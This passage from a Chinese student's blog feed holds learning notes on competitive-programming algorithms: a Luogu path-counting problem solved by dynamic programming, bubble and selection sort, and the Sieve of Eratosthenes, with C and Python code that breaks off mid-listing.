class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> a[<span class="number">21</span>][<span class="number">21</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">define_horse_control1</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> <span class="built_in">array</span>[<span class="number">21</span>][<span class="number">21</span>],<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span><span class="comment">//定义一个函数，把马控制的点赋为0</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">array</span>[x][y]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(x<span class="number">-2</span>&gt;=<span class="number">0</span>&amp;&amp;y<span class="number">-1</span>&gt;=<span class="number">0</span>)<span class="built_in">array</span>[x<span class="number">-2</span>][y<span class="number">-1</span>]=<span class="number">0</span>;<span class="comment">//这里都要判断一下有没有越界 </span></span><br><span class="line"><span class="keyword">if</span>(x<span class="number">-2</span>&gt;=<span class="number">0</span>&amp;&amp;y+<span class="number">1</span>&lt;=<span class="number">20</span>)<span class="built_in">array</span>[x<span class="number">-2</span>][y+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(x<span class="number">-1</span>&gt;=<span class="number">0</span>&amp;&amp;y<span class="number">-2</span>&gt;=<span class="number">0</span>)<span class="built_in">array</span>[x<span class="number">-1</span>][y<span class="number">-2</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(x+<span class="number">1</span>&lt;=<span class="number">20</span>&amp;&amp;y<span class="number">-2</span>&gt;=<span class="number">0</span>)<span class="built_in">array</span>[x+<span class="number">1</span>][y<span class="number">-2</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(x+<span class="number">2</span>&lt;=<span class="number">20</span>&amp;&amp;y<span class="number">-1</span>&gt;=<span class="number">0</span>)<span class="built_in">array</span>[x+<span class="number">2</span>][y<span class="number">-1</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(y+<span class="number">1</span>&lt;=<span class="number">20</span>&amp;&amp;x+<span class="number">2</span>&lt;=<span class="number">20</span>)<span class="built_in">array</span>[x+<span class="number">2</span>][y+<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(x<span class="number">-1</span>&gt;=<span class="number">0</span>&amp;&amp;y+<span class="number">2</span>&lt;=<span class="number">20</span>)<span class="built_in">array</span>[x<span class="number">-1</span>][y+<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(x+<span class="number">1</span>&lt;=<span class="number">20</span>&amp;&amp;y+<span class="number">2</span>&lt;=<span class="number">20</span>)<span class="built_in">array</span>[x+<span class="number">1</span>][y+<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">array</span>[<span class="number">21</span>][<span class="number">21</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">define_horse_control2</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> <span class="built_in">array</span>[<span class="number">21</span>][<span class="number">21</span>],<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> n,<span class="keyword">int</span> m)</span><span class="comment">//如果马的控制点在第0行或者第0列，在马控制点以后的值全为0</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x<span class="number">-2</span>==<span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(y<span class="number">-1</span>&gt;=<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=y<span class="number">-1</span>;i&lt;=n;i++)a[<span class="number">0</span>][i]=<span class="number">0</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;<span class="keyword">for</span>(<span class="keyword">int</span> i=y+<span class="number">1</span>;i&lt;=n;i++)a[<span class="number">0</span>][i]=<span class="number">0</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(x<span class="number">-1</span>==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(y<span class="number">-2</span>&gt;=<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=y<span class="number">-2</span>;i&lt;=n;i++)a[<span class="number">0</span>][i]=<span class="number">0</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;<span class="keyword">for</span>(<span class="keyword">int</span> i=y+<span class="number">2</span>;i&lt;=n;i++)a[<span class="number">0</span>][i]=<span class="number">0</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(x==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=y;i&lt;=n;i++)a[<span class="number">0</span>][i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(y<span class="number">-1</span>==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(x<span class="number">-2</span>&gt;=<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=x<span class="number">-2</span>;i&lt;=m;i++)a[i][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;<span class="keyword">for</span>(<span class="keyword">int</span> i=x+<span class="number">2</span>;i&lt;=m;i++)a[i][<span class="number">0</span>]=<span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(y<span class="number">-2</span>==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(x<span class="number">-1</span>&gt;=<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=x<span class="number">-1</span>;i&lt;=m;i++)a[i][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;<span class="keyword">for</span>(<span class="keyword">int</span> i=x+<span class="number">1</span>;i&lt;=m;i++)a[i][<span class="number">0</span>]=<span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(y==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=x;i&lt;=m;i++)a[i][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> m,n,x,y;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d %d %d %d"</span>,&amp;m,&amp;n,&amp;x,&amp;y);</span><br><span class="line">a[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)a[<span class="number">0</span>][i]=<span class="number">1</span>;<span class="comment">//到达第一行第一列的点都只有一条路径，都赋值为1</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)a[i][<span class="number">0</span>]=<span class="number">1</span>;<span class="comment">//到达第一行第一列的点都只有一条路径，都赋值为1</span></span><br><span class="line">define_horse_control1(a,x,y);<span class="comment">//把马控制的点赋为0</span></span><br><span class="line">define_horse_control2(a,x,y,n,m);<span class="comment">//如果马的控制点在第0行或者第0列，在马控制点以后的值全为0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)<span class="comment">//遍历计算到当前坐标的路径数，只需要遍历到第m行和第n列即可。 </span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((i==x<span class="number">-2</span>&amp;&amp;j==y<span class="number">-1</span>)||(i==x<span class="number">-2</span>&amp;&amp;j==y+<span class="number">1</span>)||(i==x<span class="number">-1</span>&amp;&amp;j==y<span class="number">-2</span>)||(i==x+<span class="number">1</span>&amp;&amp;j==y<span class="number">-2</span>)||(i==x+<span class="number">2</span>&amp;&amp;j==y<span class="number">-1</span>)||(j==y+<span class="number">1</span>&amp;&amp;i==x+<span class="number">2</span>)||(i==x<span class="number">-1</span>&amp;&amp;j==y+<span class="number">2</span>)||(i==x+<span class="number">1</span>&amp;&amp;j==y+<span class="number">2</span>)||(i==x&amp;&amp;j==y))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">continue</span>;<span class="comment">//跳过马的控制点的计算 </span></span><br><span class="line">&#125;</span><br><span class="line">a[i][j]=a[i][j<span class="number">-1</span>]+a[i<span class="number">-1</span>][j];<span class="comment">//当前坐标的路径数等于左边和上边路径数之和</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%lld"</span>,a[m][n]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学长给我安利洛谷平台，我打算开始做题然后提升，结果我做过河卒这个题就做了一天。刚开始写的程序有一些逻辑上的漏洞，测试时不能全部通过，曹老板告诉我可以下载测试数据来看，然后就找到漏洞所在，再一个一个的完善，做出来后还是很开心的。&lt;br&gt;&lt;img src=&quot;http://i2.tiimg.com/665720/d0a9f9971eb168e0.png&quot; alt=&quot;过河卒问题&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://i2.tiimg.com/665720/926f53a9ceaee312.png&quot; alt=&quot;过河卒问题&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="算法竞赛学习笔记" scheme="http://chenxiyuan.vip/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="算法" scheme="http://chenxiyuan.vip/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="c" scheme="http://chenxiyuan.vip/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>排序</title>
    <link href="http://chenxiyuan.vip/2018/10/30/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F/"/>
    <id>http://chenxiyuan.vip/2018/10/30/冒泡排序/</id>
    <published>2018-10-30T15:23:57.000Z</published>
    <updated>2018-11-29T10:12:12.930Z</updated>
    
    <content type="html"><![CDATA[<p>c刚看到数组，只会写个简单的冒泡排序。发现自己还真是菜，抱着ljr老师的算法书半天都看不懂，没办法只能自己慢慢啃了。</p><h2 id="算法原理-摘自百度百科"><a href="#算法原理-摘自百度百科" class="headerlink" title="算法原理(摘自百度百科)"></a>算法原理(摘自百度百科)</h2><ol><li>比较相邻的元素。如果第一个比第二个大，就交换他们两个。</li><li>对每一对相邻元素做同样的工作，从开始第一对到结尾的最后一对。在这一点，最后的元素应该会是最大的数。</li><li>针对所有的元素重复以上的步骤，除了最后一个。</li><li>持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。<a id="more"></a></li></ol><hr><p>下面用python实现<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bubble_sort</span><span class="params">(nums)</span>:</span></span><br><span class="line">    n = len(nums)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,n):  <span class="comment"># n个数，比较n-1趟</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n - i):<span class="comment">#n个数，去掉最后面排好序的(i-1)个数，剩余n-i+1个数比较n-1次，[0,n-i-1]每次判断到下标j=n-1-i即可，因为前闭后开，所以要+1</span></span><br><span class="line">            <span class="keyword">if</span> nums[j] &gt; nums[j + <span class="number">1</span>]:</span><br><span class="line">                nums[j], nums[j + <span class="number">1</span>] = nums[j + <span class="number">1</span>], nums[j]</span><br><span class="line">    <span class="keyword">return</span> nums</span><br><span class="line">print(bubble_sort([<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>]))</span><br></pre></td></tr></table></figure></p><p>下面用c实现<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 100000</span></span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x,n=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;x)==<span class="number">1</span>) a[n++]=x;<span class="comment">//最后一次n又加1,所以,数组下标0到n-1 ,n个数 </span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n<span class="number">-1</span>;i++)<span class="comment">//n个数,比较(n-1)趟</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=n-i<span class="number">-1</span>;j++)<span class="comment">//n个数,去掉最后面(i-1)个数,剩余n-i+1个数比较n-i次.每次判断到下标j=n-1-i即可 </span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[j]&gt;a[j+<span class="number">1</span>]) </span><br><span class="line">&#123;</span><br><span class="line">a[j] = a[j]+a[j+<span class="number">1</span>];</span><br><span class="line">a[j+<span class="number">1</span>] = a[j]-a[j+<span class="number">1</span>];</span><br><span class="line">a[j]=a[j]-a[j+<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"> &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=n<span class="number">-1</span>;i++)<span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><hr><p>学会选择法排序了<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span> *pa,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> index,i,k,temp;</span><br><span class="line"><span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;n<span class="number">-1</span>;k++)</span><br><span class="line">&#123;</span><br><span class="line">index=k;</span><br><span class="line"><span class="keyword">for</span>(i=k+<span class="number">1</span>;i&lt;n;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(pa[i]&lt;pa[index])index=i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(index!=k)</span><br><span class="line">&#123;</span><br><span class="line">temp=pa[index];</span><br><span class="line">pa[index]=pa[k];</span><br><span class="line">pa[k]=temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n,i;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line"><span class="keyword">int</span> a[n];</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=n<span class="number">-1</span>;i++)<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</span><br><span class="line">sort(a,n);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=n<span class="number">-1</span>;i++)<span class="built_in">printf</span>(<span class="string">"%d "</span>,*(a+i));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;c刚看到数组，只会写个简单的冒泡排序。发现自己还真是菜，抱着ljr老师的算法书半天都看不懂，没办法只能自己慢慢啃了。&lt;/p&gt;
&lt;h2 id=&quot;算法原理-摘自百度百科&quot;&gt;&lt;a href=&quot;#算法原理-摘自百度百科&quot; class=&quot;headerlink&quot; title=&quot;算法原理(摘自百度百科)&quot;&gt;&lt;/a&gt;算法原理(摘自百度百科)&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;比较相邻的元素。如果第一个比第二个大，就交换他们两个。&lt;/li&gt;
&lt;li&gt;对每一对相邻元素做同样的工作，从开始第一对到结尾的最后一对。在这一点，最后的元素应该会是最大的数。&lt;/li&gt;
&lt;li&gt;针对所有的元素重复以上的步骤，除了最后一个。&lt;/li&gt;
&lt;li&gt;持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。
    
    </summary>
    
      <category term="算法竞赛学习笔记" scheme="http://chenxiyuan.vip/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://chenxiyuan.vip/tags/python/"/>
    
      <category term="算法" scheme="http://chenxiyuan.vip/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="c" scheme="http://chenxiyuan.vip/tags/c/"/>
    
  </entry>
  
  <entry>
    <title>埃氏筛法筛素数</title>
    <link href="http://chenxiyuan.vip/2018/10/27/%E5%9F%83%E6%B0%8F%E7%AD%9B%E6%B3%95%E7%AD%9B%E7%B4%A0%E6%95%B0/"/>
    <id>http://chenxiyuan.vip/2018/10/27/埃氏筛法筛素数/</id>
    <published>2018-10-26T17:03:55.000Z</published>
    <updated>2018-11-29T05:08:14.566Z</updated>
    
    <content type="html"><![CDATA[<p>昨天实验课上，当我判断质数还在用取模方法的时候，打ACM的大佬刁老板对我说出埃氏筛，随后回到宿舍开始查，到现在整理完思路已经凌晨1点，在瑟瑟发抖中写下这篇博客。</p><hr><p>埃拉托斯特尼筛法，简称埃氏筛或爱氏筛，是一种由希腊数学家埃拉托斯特尼所提出的一种简单检定素数的算法。要得到自然数n以内的全部素数，必须把不大于根号n的所有素数的倍数剔除，剩下的就是素数。<br>下面用python实现<br><a id="more"></a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">JudgePrimes</span><span class="params">(n)</span>:</span></span><br><span class="line">    primes = []</span><br><span class="line">    f = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n+<span class="number">1</span>):<span class="comment">#这样写，可以把自然数和列表元素的序号对应起来。</span></span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">2</span> <span class="keyword">and</span> i%<span class="number">2</span> == <span class="number">0</span>:<span class="comment">#把从0到n的偶数筛掉。</span></span><br><span class="line">            f.append(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f.append(<span class="number">1</span>)</span><br><span class="line">    i = <span class="number">3</span></span><br><span class="line">    <span class="keyword">while</span> i*i &lt;= n: <span class="comment">#把不大于根号n的所有质数的倍数剔除,剩下的就是质数</span></span><br><span class="line">        <span class="keyword">if</span> f[i] == <span class="number">1</span>:<span class="comment">#判断是不是质数，若是质数，则筛掉其倍数</span></span><br><span class="line">            j = <span class="number">2</span>*i</span><br><span class="line">            <span class="keyword">while</span> j&lt;=n:<span class="comment">#把小于n的所有质数的倍数都筛掉</span></span><br><span class="line">                f[j] = <span class="number">0</span></span><br><span class="line">                j += i </span><br><span class="line">            </span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line"> </span><br><span class="line">    primes.append(<span class="number">2</span>)<span class="comment">#2是质数</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">3</span>,n+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> f[x] == <span class="number">1</span>:</span><br><span class="line">            primes.append(x)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> primes</span><br><span class="line"> </span><br><span class="line">n = int(input(<span class="string">"请输入大于1的正整数n："</span>))</span><br><span class="line">primes = JudgePrimes(n)</span><br><span class="line"><span class="keyword">print</span> (primes)</span><br></pre></td></tr></table></figure></p><hr><p>算法可以进一步优化<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">JudgePrimes</span><span class="params">(n)</span>:</span></span><br><span class="line">    primes = []</span><br><span class="line">    f = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">2</span> <span class="keyword">and</span> i%<span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            f.append(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f.append(<span class="number">1</span>)</span><br><span class="line">    i = <span class="number">3</span></span><br><span class="line">    <span class="keyword">while</span> i*i &lt;= n: <span class="comment">#把不大于根号n的所有质数的倍数剔除,剩下的就是质数</span></span><br><span class="line">        <span class="keyword">if</span> f[i] == <span class="number">1</span>:<span class="comment">#判断是不是质数，若是质数，则筛掉其倍数</span></span><br><span class="line">            j = i*i <span class="comment">#直接从质数的平方后开始筛，因为质数的平方之前的数已经被上一个质数筛过了，此时j为奇数</span></span><br><span class="line">            <span class="keyword">while</span> j &lt;= n:</span><br><span class="line">                f[j] = <span class="number">0</span></span><br><span class="line">                j += <span class="number">2</span>*i <span class="comment">#如果只加一个i,j则为i的偶数倍是一个偶数已经被筛过了，所以加2个i筛掉i的奇数倍，小优化。</span></span><br><span class="line">        i += <span class="number">2</span></span><br><span class="line"> </span><br><span class="line">    primes.append(<span class="number">2</span>)<span class="comment">#2是质数</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">3</span>,n+<span class="number">1</span>,<span class="number">2</span>):<span class="comment">#步长为2，把偶数跳过,小优化。</span></span><br><span class="line">        <span class="keyword">if</span> f[x] == <span class="number">1</span>:</span><br><span class="line">            primes.append(x)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> primes</span><br><span class="line"> </span><br><span class="line">n = int(input(<span class="string">"请输入大于1的正整数n："</span>))</span><br><span class="line">primes = JudgePrimes(n)</span><br><span class="line"><span class="keyword">print</span> (primes)</span><br></pre></td></tr></table></figure></p><p>我的c语言抠脚，下面放上照着python写的c程序<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n,j;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line"><span class="keyword">int</span> f[n+<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i&gt;<span class="number">2</span>&amp;&amp;i%<span class="number">2</span>==<span class="number">0</span>)f[i]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span> f[i]=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> i =<span class="number">3</span>;</span><br><span class="line"><span class="keyword">while</span>(i*i&lt;=n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(f[i] ==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">j=i*i;</span><br><span class="line"><span class="keyword">while</span> (j&lt;=n)</span><br><span class="line">&#123;</span><br><span class="line">f[j]=<span class="number">0</span>;</span><br><span class="line">j+=<span class="number">2</span>*i;</span><br><span 